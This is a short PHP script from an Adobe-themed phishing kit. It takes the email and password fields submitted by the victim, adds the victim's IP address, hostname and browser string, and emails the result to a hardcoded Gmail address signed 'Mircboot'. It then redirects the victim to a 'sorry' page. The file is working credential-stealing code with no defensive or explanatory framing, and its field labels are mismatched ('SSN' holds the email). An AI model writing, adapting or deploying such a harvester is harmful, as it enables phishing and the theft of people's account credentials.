<?
    $ip = getenv("REMOTE_ADDR");
	$message .= "-------------- ADOBE - Informations -------------\n";
	$message .= "SSN : ".$_POST['email']."\n";
	$message .= "Email : ".$_POST['pass']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "---------- By Mircboot ---------\n";
	$subject = "ADOBE Info Account | $ip";
	$send = "abudominica@gmail.com"; //Put You Email Here
	$headers = 'From: Mircboot' . "\r\n";
	mail($send,$subject,$message,$headers);
    echo "<meta http-equiv='refresh' content='0;URL=sorry.htm'/>";
	?>